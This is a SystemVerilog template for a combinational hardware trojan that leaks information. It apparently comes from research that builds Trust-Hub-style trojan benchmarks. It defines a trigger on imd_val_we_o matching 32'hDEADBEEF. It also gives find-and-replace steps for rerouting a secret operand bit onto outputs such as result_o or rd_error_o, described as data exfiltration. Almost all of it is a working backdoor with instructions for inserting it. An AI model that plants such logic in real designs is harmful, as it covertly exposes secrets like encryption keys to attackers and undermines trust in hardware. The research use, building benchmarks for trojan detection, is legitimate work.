/**
 * Combinational Information Leak Trojan - Code Snippet
 * 
 * Trust-Hub Category: Leak Information ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T1000, AES-T1100, AES-T600, AES-T800
 * 
 * Description:
 *   Directly routes the secret signal to an observable output when the
 *   trigger fires. Unlike the covert channel (XOR-injection, subtle),
 *   this is a direct substitution: output = secret when active.
 *   AES-T1000: routes internal AES round key directly to an output port.
 *
 *   Key distinction from Covert:
 *     Leak:   Direct routing (output = secret) - faster decode, more detectable
 *     Covert: XOR injection (output = normal ^ secret) - slower decode, more subtle
 *   
 * NOTE: This is for COMBINATIONAL modules only (no clock/registers).
 *       For sequential modules, use sequential/leak_template.sv with rotating bit index.
 *
 * Trigger: Pattern match on imd_val_we_o
 * Payload: Route operand_a_i directly to observable output
 *
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Combinational - immediate pattern match)
// ============================================================

localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

wire trojan_active;
assign trojan_active = (imd_val_we_o == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Information Leak: Route operand_a_i[0] directly to observable output.
//
// Integration Script Must:
//   Find the output assign to hijack (e.g., result_o, rd_error_o):
//     assign <output_signal> = <normal_expr>;
//   Replace with:
//     assign <output_signal> = trojan_active ? operand_a_i[0] : (<normal_expr>);
//
// Manual Example (combinational module - leak via result LSB):
//   Find:    assign result_o = adder_result;
//   Replace: assign result_o[0] = trojan_active ? operand_a_i[0] : adder_result[0];
//
// Alternative (full signal replacement for 1-bit outputs like rd_error_o):
//   Find:    assign rd_error_o = parity_check;
//   Replace: assign rd_error_o = trojan_active ? operand_a_i[0] : parity_check;
//
// Effect: When imd_val_we_o == 32'hDEADBEEF:
//   Observable output carries operand_a_i[0] directly.
//   Attacker reads output to get secret bit immediately.
//   Result: Direct, immediate 1-bit data exfiltration!